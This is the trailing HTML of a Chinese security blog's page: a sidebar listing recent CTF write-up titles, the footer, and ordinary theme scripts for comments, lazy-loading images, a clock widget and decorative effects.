card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/post/af4937d.html" title="2024长城杯溯源取证wp"><img src="/img/lazyload.gif" data-original="/img/top_img59.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="2024长城杯溯源取证wp"/></a><div class="content"><a class="title" href="/post/af4937d.html" title="2024长城杯溯源取证wp">2024长城杯溯源取证wp</a><time datetime="2024-12-21T05:40:02.000Z" title="发表于 2024-12-21 13:40:02">2024-12-21</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/post/260d256e.html" title="2024楚慧杯wp"><img src="/img/lazyload.gif" data-original="/img/top_img58.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="2024楚慧杯wp"/></a><div class="content"><a class="title" href="/post/260d256e.html" title="2024楚慧杯wp">2024楚慧杯wp</a><time datetime="2024-12-20T11:35:59.000Z" title="发表于 2024-12-20 19:35:59">2024-12-20</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/post/7c8f2a59.html" title="第二届“长城杯”信息安全铁人三项赛部分wp"><img src="/img/lazyload.gif" data-original="/img/top_img57.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="第二届“长城杯”信息安全铁人三项赛部分wp"/></a><div class="content"><a class="title" href="/post/7c8f2a59.html" title="第二届“长城杯”信息安全铁人三项赛部分wp">第二届“长城杯”信息安全铁人三项赛部分wp</a><time datetime="2024-12-16T13:40:02.000Z" title="发表于 2024-12-16 21:40:02">2024-12-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/post/7f542627.html" title="THM L1 Operation Tiny Frostbite"><img src="/img/lazyload.gif" data-original="/img/top_img56.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="THM L1 Operation Tiny Frostbite"/></a><div class="content"><a class="title" href="/post/7f542627.html" title="THM L1 Operation Tiny Frostbite">THM L1 Operation Tiny Frostbite</a><time datetime="2024-12-02T12:25:46.000Z" title="发表于 2024-12-02 20:25:46">2024-12-02</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/post/a9b06281.html" title="WuCup网络安全技能大赛WP"><img src="/img/lazyload.gif" data-original="/img/top_img55.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="WuCup网络安全技能大赛WP"/></a><div class="content"><a class="title" href="/post/a9b06281.html" title="WuCup网络安全技能大赛WP">WuCup网络安全技能大赛WP</a><time datetime="2024-12-01T11:04:35.000Z" title="发表于 2024-12-01 19:04:35">2024-12-01</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/img/top_img58.png)"><div id="footer-wrap"><div class="copyright">&copy;2024  <i id="heartbeat" class="fa fas fa-heartbeat"></i> hack_Borgeous</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">I wish you to become your own sun, no need to rely on who's light.<p><a target="_blank" href="https://hexo.io/"><img src="/img/lazyload.gif" data-original="https://img.shields.io/badge/Frame-Hexo-blue?style=flat&logo=hexo" title="博客框架为Hexo"></a>&nbsp;<a target="_blank" href="https://butterfly.js.org/"><img src="/img/lazyload.gif" data-original="https://img.shields.io/badge/Theme-Butterfly-6513df?style=flat&logo=bitdefender" title="主题采用butterfly"></a>&nbsp;<a target="_blank" href="https://www.jsdelivr.com/"><img src="/img/lazyload.gif" data-original="https://img.shields.io/badge/CDN-jsDelivr-orange?style=flat&logo=jsDelivr" title="本站使用JsDelivr为静态资源提供CDN加速"></a> &nbsp;<a target="_blank" href="https://vercel.com/ "><img src="/img/lazyload.gif" data-original="https://img.shields.io/badge/Hosted-Vervel-brightgreen?style=flat&logo=Vercel" title="本站采用双线部署，默认线路托管于Vercel"></a>&nbsp;<a target="_blank" href="https://vercel.com/ "><img src="/img/lazyload.gif" data-original="https://img.shields.io/badge/Hosted-Coding-0cedbe?style=flat&logo=Codio" title="本站采用双线部署，联通线路托管于Coding"></a>&nbsp;<a target="_blank" href="https://github.com/"><img src="/img/lazyload.gif" data-original="https://img.shields.io/badge/Source-Github-d021d6?style=flat&logo=GitHub" title="本站项目由Gtihub托管"></a>&nbsp;<a target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/4.0/"><img src="/img/lazyload.gif" data-original="https://img.shields.io/badge/Copyright-BY--NC--SA%204.0-d42328?style=flat&logo=Claris" title="本站采用知识共享署名-非商业性使用-相同方式共享4.0国际许可协议进行许可"></a></p></div></div><link rel="stylesheet" href="https://fastly.jsdelivr.net/gh/HCLonely/images@master/others/heartbeat.min.css"></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>(() => {
  const getCount = () => {
    const countELement = document.getElementById('twikoo-count')
    if(!countELement) return
    twikoo.getCommentsCount({
      envId: 'https://my-twikoo-opal.vercel.app/',
      region: '',
      urls: [window.location.pathname],
      includeReply: false
    }).then(res => {
      countELement.textContent = res[0].count
    }).catch(err => {
      console.error(err)
    })
  }

  const init = () => {
    twikoo.init(Object.assign({
      el: '#twikoo-wrap',
      envId: 'https://my-twikoo-opal.vercel.app/',
      region: '',
      onCommentLoaded: () => {
        btf.loadLightbox(document.querySelectorAll('#twikoo .tk-content img:not(.tk-owo-emotion)'))
      }
    }, null))

    GLOBAL_CONFIG_SITE.isPost && getCount()
  }

  const loadTwikoo = () => {
    if (typeof twikoo === 'object') setTimeout(init,0)
    else getScript('https://cdn.jsdelivr.net/npm/twikoo@1.6.31/dist/twikoo.all.min.js').then(init)
  }

  if ('Twikoo' === 'Twikoo' || !true) {
    if (true) btf.loadComment(document.getElementById('twikoo-wrap'), loadTwikoo)
    else loadTwikoo()
  } else {
    window.loadOtherComment = loadTwikoo
  }
})()</script></div><script async src="/js/title.js"></script><script async src="https://npm.elemecdn.com/tzy-blog/lib/js/other/sakura.js"></script><canvas id="universe"></canvas><script defer src="/js/universe.js"></script><script src="/js/fish.js"></script><script src="/js/bilibili-banner.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/js-heo@1.0.11/categoryBar/categoryBar.css"><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = false;
POWERMODE.mobile = false;
document.body.addEventListener('input', POWERMODE);
</script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/click-show-text.min.js" data-mobile="false" data-text="富强,民主,文明,和谐,自由,平等,公正,法治,爱国,敬业,诚信,友善" data-fontsize="15px" data-random="false" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.13.0"></script></div></div><!-- hexo injector body_end start --><script data-pjax>
  function butterfly_clock_anzhiyu_injector_config(){
    var parent_div_git = document.getElementsByClassName('sticky_layout')[0];
    var item_html = '<div class="card-widget card-clock"><div class="card-glass"><div class="card-background"><div class="card-content"><div id="hexo_electric_clock"><img class="entered loading" id="card-clock-loading" src="/img/lazyload.gif" data-original="https://cdn.cbd.int/hexo-butterfly-clock-anzhiyu/lib/loading.gif" style="height: 120px; width: 100%;" data-ll-status="loading"/></div></div></div></div></div>';
    console.log('已挂载butterfly_clock_anzhiyu')
    if(parent_div_git) {
      parent_div_git.insertAdjacentHTML("afterbegin",item_html)
    }
  }
  var elist = 'null'.split(',');
  var cpage = location.pathname;
  var epage = 'all';
  var qweather_key = 'b16a1fa0e63c46a4b8f28abfb06ae3fe';
  var gaud_map_key = '5e02e3f682596d2384652be789b5c03e';
  var baidu_ak_key = 'undefined';
  var flag = 0;
  var clock_rectangle = '112.982279,28.19409';
  var clock_default_rectangle_enable = 'false';

  for (var i=0;i<elist.length;i++){
    if (cpage.includes(elist[i])){
      flag++;
    }
  }

  if ((epage ==='all')&&(flag == 0)){
    butterfly_clock_anzhiyu_injector_config();
  }
  else if (epage === cpage){
    butterfly_clock_anzhiyu_injector_config();
  }
  </script><script src="https://widget.qweather.net/simple/static/js/he-simple-common.js?v=2.0"></script><script data-pjax src="https://cdn.cbd.int/hexo-butterfly-clock-anzhiyu/lib/clock.min.js"></script><script async src="//at.alicdn.com/t/font_2032782_8d5kxvn09md.js"></script><!-- hexo injector body_end end --><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"right","width":150,"height":300,"hOffset":20,"vOffset":-20},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/"});</script>
        <style>
            [bg-lazy] {
                background-image: none !important;
                background-color: #eee !important;
            }
        </style>
        <script>
            window.imageLazyLoadSetting = {
                isSPA: false,
                preloadRatio: 1,
                processImages: null,
            };
        </script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})});</script><script>!function(r){r.imageLazyLoadSetting.processImages=t;var e=r.imageLazyLoadSetting.isSPA,n=r.imageLazyLoadSetting.preloadRatio||1,c=a();function a(){var t=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")),e=Array.prototype.slice.call(document.querySelectorAll("[bg-lazy]"));return t.concat(e)}function t(){e&&(c=a());for(var t,o=0;o<c.length;o++)0<=(t=(t=c[o]).getBoundingClientRect()).bottom&&0<=t.left&&t.top<=(r.innerHeight*n||document.documentElement.clientHeight*n)&&function(){var t,e,n,a,i=c[o];e=function(){c=c.filter(function(t){return i!==t}),r.imageLazyLoadSetting.onImageLoaded&&r.imageLazyLoadSetting.onImageLoaded(i)},(t=i).hasAttribute("bg-lazy")?(t.removeAttribute("bg-lazy"),e&&e()):(n=new Image,a=t.getAttribute("data-original"),n.onload=function(){t.src=a,t.removeAttribute("data-original"),e&&e()},t.src!==a&&(n.src=a))}()}function i(){clearTimeout(t.tId),t.tId=setTimeout(t,500)}t(),document.addEventListener("scroll",i),r.addEventListener("resize",i),r.addEventListener("orientationchange",i)}(this);</script></body></html>